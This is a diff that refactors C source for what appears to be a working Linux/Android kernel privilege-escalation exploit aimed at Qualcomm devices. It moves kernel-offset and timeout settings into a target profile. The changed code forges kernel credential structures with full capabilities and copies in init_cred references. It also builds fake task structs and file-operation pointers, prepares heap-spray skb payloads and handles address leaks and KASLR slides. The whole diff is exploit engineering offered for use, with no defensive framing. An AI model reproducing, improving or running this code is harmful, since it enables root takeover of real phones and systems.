@@ -18,6 +18,10 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+static const struct kernel_offsets *profile_values(void) {
+  return target_profile_values(&g_target_profile);
+}
+
 /* Decoupling plan: compute elapsed monotonic time. Input: reference timestamp;
  * output: milliseconds. Future: shared_elapsed_ms(const struct timespec *). */
 static long long ms_since(struct timespec *t0) {
@@ -45,18 +49,14 @@ uintptr_t fake_fops;
  * runtime-config snapshot; output: boolean. Future:
  * tcp_zerocopy_supports(profile, config), with no environment reread. */
 int tcp_route_selected(void) {
-  // TODO(decoupling:S08-profile): Future: tcp_zerocopy_supports(profile, config).
-  // Input: immutable TargetProfile and RuntimeConfig; output: route capability.
-  // Blocked by: TargetProfile is introduced in S08; completion removes this TODO.
-  return g_runtime_config.tcp_zerocopy_enabled && active_offsets &&
-         active_offsets->compact_waiter;
+  return g_runtime_config.tcp_zerocopy_enabled &&
+         target_profile_supports_tcp_zerocopy(&g_target_profile);
 }
 
 /* Decoupling plan: report multicast-waiter capability. Input: profile; output:
  * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
 int kernel5_route_selected(void) {
-  return active_offsets && active_offsets->kernel_major == 5 &&
-         active_offsets->mcast_waiter_off > 0;
+  return target_profile_supports_multicast_waiter(&g_target_profile);
 }
 
 /* Allocate the address-discovery engine. Inputs: resolved profile geometry and
@@ -166,8 +166,9 @@ void log_startup_context(void) {
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)p0_kernel_phys_load,
-             (unsigned long long)P0_KERNEL_PHYS_DELTA,
+             (unsigned long long)g_resolved_addresses.kernel_phys_load,
+             (unsigned long long)(g_resolved_addresses.kernel_phys_load -
+                                  P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
@@ -199,19 +200,7 @@ long sched_setattr_tid(int tid, int nice_value) {
   return ret;
 }
 
-/* Bootloader-selected physical load address. */
-uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
-
-uint64_t g_direct_map_end = DIRECT_MAP_END;
-
-/* Selected entry's init_cred image address. */
-uintptr_t g_init_cred_image;
-
-/* S06 authoritative address snapshot. The two scalars above remain mirrors
- * for compatibility macros until their S08/S15 consumers are migrated. */
-// TODO(decoupling:S08-addresses): Future: pass const ResolvedAddresses to consumers.
-// Input: session-owned address snapshot; output: remove p0/g_init scalar mirrors.
-// Blocked by: payload/SLIDE macros; completion in S08 removes this comment.
+/* S06 authoritative address snapshot. */
 ResolvedAddresses g_resolved_addresses = {
     .soc = TARGET_SOC_QCOM,
     .kernel_phys_load = P0_KERNEL_PHYS_LOAD,
@@ -227,20 +216,6 @@ void init_p0_profile(void) {
                                P0_PHYS_OFFSET));
 }
 
-/* Decoupling plan: translate an image address through the selected SoC mapping.
- * Inputs: ResolvedAddresses and image address; output: alias. Future:
- * address_space_data_alias(const ResolvedAddresses *, uintptr_t). */
-uintptr_t p0_data_alias(uintptr_t image_addr) {
-  return resolved_addresses_data_alias(&g_resolved_addresses, image_addr);
-}
-
-/* Decoupling plan: compatibility address translator. Inputs: explicit address
- * space and image address; output: runtime address. Future:
- * address_space_resolve_data(); remove implicit profile/global reads. */
-uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr);
-}
-
 void put64(unsigned char *p, size_t off, uint64_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
@@ -253,39 +228,36 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
  * profile, destination and offset; output: validation/status. Future:
  * payload_build_credential_template(profile, buffer, offset). */
 static int fill_profile_cred_copy(unsigned char *p, size_t off) {
-  if (!active_offsets || !active_offsets->cred_copy_size ||
-      active_offsets->cred_copy_size > ORDER3_SIZE ||
-      active_offsets->cred_usage_offset + sizeof(uint32_t) >
-          active_offsets->cred_copy_size ||
-      active_offsets->cred_caps_offset +
-              active_offsets->cred_caps_count * sizeof(uint64_t) >
-          active_offsets->cred_copy_size) {
+  const struct kernel_offsets *v = profile_values();
+  if (!v || !v->cred_copy_size || v->cred_copy_size > ORDER3_SIZE ||
+      v->cred_usage_offset + sizeof(uint32_t) > v->cred_copy_size ||
+      v->cred_caps_offset + v->cred_caps_count * sizeof(uint64_t) >
+          v->cred_copy_size) {
     pr_error("credential copy profile is incomplete\n");
     return 0;
   }
   unsigned char *c = p + off;
-  memset(c, 0, active_offsets->cred_copy_size);
-  put32(c, active_offsets->cred_usage_offset,
-        active_offsets->cred_usage_value);
-  for (uint32_t i = 0; i < active_offsets->cred_caps_count; i++) {
-    put64(c, active_offsets->cred_caps_offset + i * sizeof(uint64_t),
-          active_offsets->cred_caps_value);
+  memset(c, 0, v->cred_copy_size);
+  put32(c, v->cred_usage_offset, v->cred_usage_value);
+  for (uint32_t i = 0; i < v->cred_caps_count; i++) {
+    put64(c, v->cred_caps_offset + i * sizeof(uint64_t), v->cred_caps_value);
   }
 
   const uint32_t ref_offsets[] = {
-      active_offsets->cred_ref0_offset, active_offsets->cred_ref1_offset,
-      active_offsets->cred_ref2_offset, active_offsets->cred_ref3_offset,
+      v->cred_ref0_offset, v->cred_ref1_offset,
+      v->cred_ref2_offset, v->cred_ref3_offset,
   };
   const uint64_t ref_images[] = {
-      active_offsets->cred_ref0_image, active_offsets->cred_ref1_image,
-      active_offsets->cred_ref2_image, active_offsets->cred_ref3_image,
+      v->cred_ref0_image, v->cred_ref1_image,
+      v->cred_ref2_image, v->cred_ref3_image,
   };
-  for (size_t i = 0; i < active_offsets->cred_ref_count; i++) {
-    if (ref_offsets[i] + sizeof(uint64_t) > active_offsets->cred_copy_size) {
+  for (size_t i = 0; i < v->cred_ref_count; i++) {
+    if (ref_offsets[i] + sizeof(uint64_t) > v->cred_copy_size) {
       pr_error("credential reference %zu exceeds configured copy size\n", i);
       return 0;
     }
-    put64(c, ref_offsets[i], data_addr(ref_images[i]));
+    put64(c, ref_offsets[i],
+          resolved_addresses_data_alias(&g_resolved_addresses, ref_images[i]));
   }
   return 1;
 }
@@ -509,7 +481,8 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
   PayloadWriteLayout write_layout = payload_write_layout(
       request, base, default_fops, credential_fops,
-      data_addr(g_init_cred_image));
+      resolved_addresses_data_alias(&g_resolved_addresses,
+                                    g_resolved_addresses.init_cred_image));
   fake_parent = write_layout.parent;
   fake_right = write_layout.right;
   fake_left = write_layout.left;
@@ -525,10 +498,8 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
   uint64_t pi_top_task = SLIDE_INIT_TASK;
 
-  int compact = active_offsets && active_offsets->compact_waiter;
-  // TODO(decoupling:S08-payload-profile): Future: payload_build_shared_layout()
-  // receives TargetProfile. Input: immutable profile/request; output: bytes.
-  // Blocked by: semantic profile accessors; completion removes this TODO.
+  const struct kernel_offsets *v = profile_values();
+  int compact = target_profile_has_compact_waiter(&g_target_profile);
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + chunk_bias;
@@ -577,19 +548,19 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
     }
 
     /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
-    uint32_t ft_prio_off       = compact ? active_offsets->task_prio
+    uint32_t ft_prio_off       = compact ? v->task_prio
                                          : FAKE_TASK_PRIO_OFF;
-    uint32_t ft_nprio_off      = compact ? active_offsets->task_normal_prio
+    uint32_t ft_nprio_off      = compact ? v->task_normal_prio
                                          : FAKE_TASK_NORMAL_PRIO_OFF;
-    uint32_t ft_tg_off         = compact ? active_offsets->task_sched_task_group
+    uint32_t ft_tg_off         = compact ? v->task_sched_task_group
                                          : FAKE_TASK_TASK_GROUP_OFF;
-    uint32_t ft_pi_lock_off    = compact ? active_offsets->task_pi_lock
+    uint32_t ft_pi_lock_off    = compact ? v->task_pi_lock
                                          : FAKE_TASK_PI_LOCK_OFF;
-    uint32_t ft_pi_wait_off    = compact ? active_offsets->task_pi_waiters
+    uint32_t ft_pi_wait_off    = compact ? v->task_pi_waiters
                                          : FAKE_TASK_PI_WAITERS_OFF;
-    uint32_t ft_pi_top_off     = compact ? active_offsets->task_pi_top_task
+    uint32_t ft_pi_top_off     = compact ? v->task_pi_top_task
                                          : FAKE_TASK_PI_TOP_TASK_OFF;
-    uint32_t ft_pi_blocked_off = compact ? active_offsets->task_pi_blocked_on
+    uint32_t ft_pi_blocked_off = compact ? v->task_pi_blocked_on
                                          : FAKE_TASK_PI_BLOCKED_ON_OFF;
 
     put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
@@ -695,8 +666,11 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
         break;
       }
       long long waited = ms_since(&t_wait);
-      if (waited >= 60000) {
-        pr_warning("leak child stuck >60s, killing it\n");
+      uint32_t timeout_ms =
+          target_profile_execution(&g_target_profile)
+              ->heap_kernelsnitch_timeout_ms;
+      if ((uint64_t)waited >= timeout_ms) {
+        pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
         kill(child_leak, SIGKILL);
         waitpid(child_leak, NULL, 0);
         break;
@@ -838,11 +812,20 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
  * Inputs: HeapContext and request; output: PayloadPage/status. Future:
  * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
 uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
-  int max_attempts = 4;
+  const struct execution_settings *execution =
+      target_profile_execution(&g_target_profile);
+  int max_attempts = (int)execution->heap_prepare_max_attempts;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
-  deadline.tv_sec += 240;
+  uint64_t timeout_ns =
+      (uint64_t)execution->heap_prepare_timeout_ms * 1000000ULL;
+  deadline.tv_sec += (time_t)(timeout_ns / 1000000000ULL);
+  deadline.tv_nsec += (long)(timeout_ns % 1000000000ULL);
+  if (deadline.tv_nsec >= 1000000000L) {
+    deadline.tv_sec++;
+    deadline.tv_nsec -= 1000000000L;
+  }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(request);
     if (base) {
@@ -860,7 +843,8 @@ uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
     }
     struct timespec now;
     clock_gettime(CLOCK_MONOTONIC, &now);
-    if (now.tv_sec >= deadline.tv_sec) {
+    if (now.tv_sec > deadline.tv_sec ||
+        (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
       pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
       break;
     }
